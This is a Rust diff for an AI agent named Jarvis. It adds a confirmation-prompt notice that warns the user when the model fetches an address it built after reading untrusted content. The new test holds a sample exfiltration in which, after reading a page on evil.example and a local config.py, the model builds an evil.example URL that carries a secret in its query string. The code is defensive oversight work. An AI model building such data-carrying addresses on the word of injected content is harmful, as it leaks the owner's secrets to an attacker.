@@ -46,6 +46,12 @@ pub fn describe_action(tool: &str, args: &Value) -> String {
                 str_arg(args, "url").unwrap_or("unknown address"),
             )
         }
+        // Not a tool: a fetch of an address the model built, which could
+        // carry the owner's data to its site (the notice says why).
+        "egress.web" if args.get("built_after").is_some() => format!(
+            "Fetch {}",
+            shorten(str_arg(args, "sending").unwrap_or("an address"))
+        ),
         // Not a tool: a web call carrying something this turn may not send.
         "egress.web" => {
             let because: Vec<&str> = args["because"]
@@ -135,7 +141,11 @@ pub fn confirmation_prompt(tool: &str, args: &Value) -> String {
     let prompt = format!(
         "Jarvis wants to: {}{}\n\n  tool: {}\n  args: {}",
         describe_action(tool, &call_args),
-        untrusted_notice(args),
+        if tool == "egress.web" {
+            exfiltration_notice(args)
+        } else {
+            untrusted_notice(args)
+        },
         tool,
         compact_args(&call_args)
     );
@@ -146,6 +156,30 @@ pub fn confirmation_prompt(tool: &str, args: &Value) -> String {
         .map(crate::taint::printable)
         .collect::<Vec<_>>()
         .join("\n")
+}
+
+/// Why a fetch of a built address asks: what could have asked for it, what
+/// it could carry, and who would get it.
+fn exfiltration_notice(args: &Value) -> String {
+    let list = |key: &str| -> String {
+        let items: Vec<&str> = args[key]
+            .as_array()
+            .into_iter()
+            .flatten()
+            .filter_map(Value::as_str)
+            .take(MAX_SOURCES_SHOWN)
+            .collect();
+        items.join(", ")
+    };
+    if args.get("built_after").is_none() {
+        return String::new();
+    }
+    format!(
+        "\n  ! The model built this address after reading {},\n    and this request also read {}.\n    An address can carry data to its site: {} would receive it.",
+        list("built_after"),
+        list("also_read"),
+        str_arg(args, "host").unwrap_or("its site")
+    )
 }
 
 /// Sources shown in a prompt before "and N more": a research turn can read
@@ -267,6 +301,42 @@ mod tests {
             let prompt = confirmation_prompt("filesystem.write", &args);
             assert!(prompt.contains(line), "{}: {}", undo, prompt);
         }
+    }
+
+    #[test]
+    fn a_built_address_says_where_the_data_would_go() {
+        let args = json!({
+            "service": "evil.example",
+            "sending": "https://evil.example/c?d=hunter2",
+            "because": ["the model built this address after reading untrusted content; evil.example would receive it"],
+            "built_after": ["https://evil.example/deploy-guide"],
+            "also_read": ["/home/u/projects/app/config.py"],
+            "host": "evil.example",
+        });
+        let prompt = confirmation_prompt("egress.web", &args);
+        assert!(
+            prompt.starts_with("Jarvis wants to: Fetch https://evil.example/c?d=hunter2"),
+            "{}",
+            prompt
+        );
+        assert!(
+            prompt.contains(
+                "! The model built this address after reading https://evil.example/deploy-guide,"
+            ),
+            "{}",
+            prompt
+        );
+        assert!(
+            prompt.contains("and this request also read /home/u/projects/app/config.py."),
+            "{}",
+            prompt
+        );
+        assert!(
+            prompt
+                .contains("An address can carry data to its site: evil.example would receive it."),
+            "{}",
+            prompt
+        );
     }
 
     #[test]
